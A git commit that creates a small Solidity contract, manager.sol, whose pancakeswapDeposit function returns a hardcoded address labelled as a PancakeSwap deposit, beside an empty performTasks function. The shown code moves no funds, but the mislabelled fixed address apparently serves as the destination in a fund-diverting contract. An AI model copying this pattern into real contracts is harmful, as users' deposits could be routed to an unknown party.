15731b1b327727c72d45d17913978344e66c3574
Cris Sierra Gil <cris777@users.noreply.github.com>
2022-02-19 23:39:26 -0500

    Create manager.sol

---
+++ manager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0xb5522eB3cC202958dd60443baE718385E2A4509A;
+	}
+	
+}
